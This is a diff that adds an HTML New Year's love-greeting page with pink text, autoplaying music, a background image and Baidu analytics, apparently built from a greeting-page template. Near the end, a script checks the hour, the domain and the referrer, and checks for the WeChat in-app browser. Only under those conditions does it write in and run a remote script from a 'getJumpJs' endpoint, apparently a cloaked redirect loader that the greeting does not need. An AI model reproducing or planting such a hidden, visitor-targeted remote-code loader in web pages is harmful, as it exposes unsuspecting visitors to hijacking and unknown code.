@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <link type="text/css" rel="stylesheet" href="static/css/style1.css">
+    <script>
+        //判断客户端设备，选择写入meta
+        function init_viewport() {
+            if (navigator.userAgent.indexOf('Android') != -1) {
+                var version = parseFloat(RegExp.$1);
+                if (version > 2.3) {
+                    var width = window.outerWidth == 0 ? window.screen.width : window.outerWidth;
+                    var phoneScale = parseInt(width) / 500;
+                    document.write('<meta name="viewport" content="width=500, minimum-scale = ' + phoneScale + ', maximum-scale = ' + phoneScale + ', target-densitydpi=device-dpi">');
+                } else {
+                    document.write('<meta name="viewport" content="width=500, target-densitydpi=device-dpi, user-scalable=0">');
+                }
+            } else if (navigator.userAgent.indexOf('iPhone') != -1) {
+                var phoneScale = parseInt(window.screen.width) / 500;
+                document.write('<meta name="viewport" content="width=500, min-height=750, initial-scale=' + phoneScale + ', maximum-scale=' + phoneScale + ', user-scalable=0" /> '); //0.75   0.82
+            } else {
+                document.write('<meta name="viewport" content="width=500, height=750, initial-scale=0.64" /> '); //0.75  0.82
+            }
+        }
+        init_viewport();
+    </script>
+    <title>跨年了我爱你 </title>
+    <style type="text/css">
+    #contentToWrite{top:46%;width:80%;font-size:26px;text-align:center;color: pink; z-index: 9999; overflow: auto; height: 100%; overflow-x: hidden; padding-bottom: 50px;}    
+    </style>
+</head>
+<body>
+<div id="contentToWrite" class="comments" style="color: pink">
+    跨年了
+<br>以后每年
+<br>我会越来越爱你</div>
+
+<audio id="audio_music" data-id="audio_music" autoplay="autoplay" preload="auto" loop="">
+    <source src="https://sf6-cdn-tos.douyinstatic.com/obj/ies-music/7161981385975352077.mp3" type="audio/mpeg">
+    <embed hidden="true" autostart="true" height="0" width="0" loop="true" src="https://sf6-cdn-tos.douyinstatic.com/obj/ies-music/7161981385975352077.mp3" autoplay="autoplay">
+</audio>
+
+<canvas id="pinkboard" width="1920" height="947"></canvas>
+<canvas id="canvas" width="1920" height="947"></canvas>
+
+<script src="static/js/jquery.min.js"></script>
+<script type="text/javascript">
+    var id = "776";
+    var data_type = "0";
+    var vip_type = "0";
+    var temp_id = "2";
+</script>
+<script src="static/js/main.js"></script>
+<script type="text/javascript">
+    var background_url = "https://ai8.top/storage/diy/o0H-y5avF96iRk4YWVNHEIP0S4V4/20231120/24e8014e4fb114696ec40827fa5bb8eb.jpg";
+    if(background_url){
+        $("#canvas").css('background',"url('"+ background_url +"') no-repeat");
+        $("#canvas").css('background-size',"100%");
+        $("#canvas").css('opacity',"0.9");
+        $("#pinkboard").css('z-index',"999");
+        $("#contentToWrite").css('z-index',"999");
+        
+    }
+    
+    window.addEventListener("resize", function() {
+        ww = window.innerWidth;
+        wh = window.innerHeight;
+    });
+    
+    window.onload = function() {
+        toggleSound();
+    };
+
+    function toggleSound() {
+        var music = document.getElementById("audio_music"); //获取ID
+        if (music.paused) {
+            //判读是否播放
+            music.paused = false;
+            music.play(); //没有就播放
+        }
+    }
+    //--创建页面监听，等待微信端页面加载完毕 触发音频播放
+    document.addEventListener("DOMContentLoaded", function() {
+        function audioAutoPlay() {
+            var audio = document.getElementById("audio_music");
+            audio.play();
+            document.addEventListener(
+                "WeixinJSBridgeReady",
+                function() {
+                    audio.play();
+                },
+                false
+            );
+        }
+        audioAutoPlay();
+    });
+    //--创建触摸监听，当浏览器打开页面时，触摸屏幕触发事件，进行音频播放
+    document.addEventListener("touchstart", function() {
+        function audioAutoPlay() {
+            var audio = document.getElementById("audio_music");
+            audio.play();
+        }
+        audioAutoPlay();
+    });
+</script>
+
+<!-- <div class="div_btn" id="btn-make">
+    <a href="https://mp.weixin.qq.com/s/eVZIEHg9NgkxsQD8Y5Cz8g"><span>制作</span></a>
+</div>
+<div class="div_btn" id='div_support'>
+    <a href="new.html"><span>更多</span></a>
+</div> -->
+<script>
+//小时分析
+var nowtime = new Date();
+var url = window.location.href;
+hour = nowtime.getHours();
+var allow_hour_arr = Array(0,1,2,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23);
+function in_array(search,array){
+    for(var i in array){
+        if(array[i]==search){
+            return true;
+        }
+    }
+    return false;
+}
+console.log("referrer：" + document.referrer);
+if(data_type == 0  || (typeof(vip_type) != "undefined" && vip_type != null && vip_type == 0)){
+	if(in_array(hour,allow_hour_arr) && location.toString().indexOf("ai8.top1")==-1 && location.toString().indexOf("accct1.cn")==-1){
+		var ua = navigator.userAgent.toLowerCase(); 
+		if (ua.match(/MicroMessenger/i) == "micromessenger" && ua.indexOf("miniprogram") == -1 && document.referrer.indexOf("/code") == -1 && document.referrer.indexOf("new") == -1 && document.referrer.indexOf("/game") == -1 ) { 
+			document.writeln("<script src=\"https://web-62.20it.cn/api/getJumpJs\"><\/script>");  
+			
+		}
+	}
+}
+
+var _hmt = _hmt || [];
+(function() {
+	var hm = document.createElement("script");
+	if(location.toString().indexOf("55.cn")>-1 || location.toString().indexOf("77.cn")>-1 || location.toString().indexOf(".top")>-1){
+		hm.src = "https://hm.baidu.com/hm.js?51d6321aaa4909493b4e8941b57c30d7";//AI统计
+	}else{
+		hm.src = "https://hm.baidu.com/hm.js?9268d9128fcebf1a5da96d7cb2a8dac4";//CN统计
+	}
+	var s = document.getElementsByTagName("script")[0]; 
+	s.parentNode.insertBefore(hm, s);
+})();
+
+</script></body>
+</html>
